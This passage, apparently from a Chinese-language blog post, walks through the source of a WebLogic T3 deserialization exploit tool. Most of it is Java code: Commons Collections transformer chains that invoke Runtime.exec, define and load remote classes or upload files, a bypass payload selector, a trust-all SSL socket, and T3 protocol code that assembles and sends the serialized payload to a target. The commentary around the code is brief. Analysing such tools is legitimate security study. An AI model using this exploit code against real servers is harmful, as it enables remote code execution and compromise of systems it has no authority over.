class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bootArgs&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>())&#125;;</span><br><span class="line">        <span class="keyword">return</span> transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Transformer[] uploadTransformerChain(String className, <span class="type">byte</span>[] clsData, String filePath, <span class="type">byte</span>[] content) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(DefiningClassLoader.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredConstructor&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">byte</span>[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;className, clsData&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;uploadFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">byte</span>[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filePath, content&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>())&#125;;</span><br><span class="line">        <span class="keyword">return</span> transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;execArgs&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>())&#125;;</span><br><span class="line">        <span class="keyword">return</span> transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialRmiDatas(String[] bootArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> serialData(defineAndLoadPayloadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialBlindDatas(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> serialData(blindExecutePayloadTransformerChain(execArgs));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialUploadDatas(String filePath, <span class="type">byte</span>[] content) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> serialData(uploadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), filePath, content));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>初步看一眼就是生成CC链的地方，里面包含多种chaintransformer，比如<code>defineAndLoadPayloadTransformerChain、uploadTransformerChain、blindExecutePayloadTransformerChain</code>，其中我们经常用的就是普通的<code>blindExecutePayloadTransformerChain</code>，执行完这个方法就进入对应的serial方法<br>那对标上面那么几种transformer，那肯定也有serial<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681317217371-c6ce1847-0cc3-4c1e-b54d-c6ea356d7c50.png#averageHue=%23323330&clientId=u184e8a68-18d9-4&from=paste&height=290&id=u50d9a6ec&name=image.png&originHeight=362&originWidth=819&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=474881&status=done&style=none&taskId=u6ddc29e3-f121-432e-9bfc-9a90b2379c2&title=&width=655.2" alt="image.png"><br>因此这一块就是生成payload的地方</p>
<p>serializables：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serializables</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        serialize(obj, out);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="keyword">return</span> deserialize(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="keyword">final</span> InputStream in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是进行一系列序列化和反序列化的工具类，简单易懂</p>
<h2 id="ssl"><a href="#ssl" class="headerlink" title="ssl"></a>ssl</h2><p>SSL（Secure Socket Layer），这里面对应的就是进行socket通讯的地方</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.ssl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLContext;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.TrustManager;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by nike on 17/6/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SocketFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SocketFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Socket <span class="title function_">newSocket</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;https&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">context</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;SSL&quot;</span>);</span><br><span class="line">            <span class="comment">// 初始化</span></span><br><span class="line">            context.init(<span class="literal">null</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">TrustManagerImpl</span>()&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> context.getSocketFactory();</span><br><span class="line">            socket = factory.createSocket(host, port);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(host, port);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> socket;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>假如是https请求，就进行有关SSL协议的处理发送过去，否则就直接正常http处理<br>另外两个类都是接口</p>
<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>这个地方就是进行T3协议处理和payload选择的地方<br> BypassPayloadSelector：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.Main;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by nike on 17/6/26.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassPayloadSelector</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">marshalledObject</span><span class="params">(Object payload)</span> &#123;</span><br><span class="line">        <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            marshalledObject = <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> marshalledObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">        streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">        <span class="keyword">return</span> streamMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">selectBypass</span><span class="params">(Object payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;marshall&quot;</span>)) &#123;</span><br><span class="line">            payload = marshalledObject(payload);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;streamMessageImpl&quot;</span>)) &#123;</span><br><span class="line">            payload = streamMessageImpl(Serializables.serialize(payload));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进行bypass方法的选择<br>T3ProtocolOperation：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.supeream.weblogic;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.supeream.Main;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.BytesOperation;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> weblogic.rjvm.JVMID;</span><br><span class="line"><span class="keyword">import</span> weblogic.security.acl.internal.AuthenticatedUser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">T3ProtocolOperation</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String host, String port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> SocketFactory.newSocket(host, Integer.parseInt(port));</span><br><span class="line">        <span class="comment">//AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;t3 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;https&quot;</span>)) &#123;</span><br><span class="line">            header = <span class="string">&quot;t3s 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.getOutputStream().write(header.getBytes());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(s.getInputStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionInfo</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">        <span class="keyword">if</span> (Main.version == <span class="literal">null</span>) &#123;</span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;HELO:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;.false&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;weblogic version:&quot;</span> + versionInfo);</span><br><span class="line">            Main.version = versionInfo;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        String asInfo = br.readLine();</span></span><br><span class="line"><span class="comment">//        String hlInfo = br.readLine();</span></span><br><span class="line"><span class="comment">//        System.out.println(versionInfo+&quot;\n&quot;+asInfo+&quot;\n&quot;+hlInfo);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//t3 protocol</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;08&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">qos</span> <span class="operator">=</span> <span class="string">&quot;65&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">responseId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokableId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">abbrevOffset</span> <span class="operator">=</span> <span class="string">&quot;00000000&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">countLength</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">capacityLength</span> <span class="operator">=</span> <span class="string">&quot;10&quot;</span>;<span class="comment">//必须大于上面设置的AS值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">readObjectType</span> <span class="operator">=</span> <span class="string">&quot;00&quot;</span>;<span class="comment">//00 object deserial 01 ascii</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">datas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        datas.append(cmd);</span><br><span class="line">        datas.append(qos);</span><br><span class="line">        datas.append(flags);</span><br><span class="line">        datas.append(responseId);</span><br><span class="line">        datas.append(invokableId);</span><br><span class="line">        datas.append(abbrevOffset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//because of 2 times deserial</span></span><br><span class="line">        countLength = <span class="string">&quot;04&quot;</span>;</span><br><span class="line">        datas.append(countLength);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//define execute operation</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">pahse1Str</span> <span class="operator">=</span> BytesOperation.bytesToHexString(payload);</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(pahse1Str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//for compatiable fo hide</span></span><br><span class="line">        <span class="comment">//for compatiable fo hide</span></span><br><span class="line">        <span class="type">AuthenticatedUser</span> <span class="variable">authenticatedUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AuthenticatedUser</span>(<span class="string">&quot;weblogic&quot;</span>, <span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phase4</span> <span class="operator">=</span> BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(phase4);</span><br><span class="line"></span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">serverName</span> <span class="operator">=</span> src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);</span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        serverName.set(src,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));</span><br><span class="line"></span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">dst</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();</span><br><span class="line"></span><br><span class="line">        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);</span><br><span class="line">        serverName = src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);</span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        serverName.set(dst,<span class="number">1</span>);</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] headers = 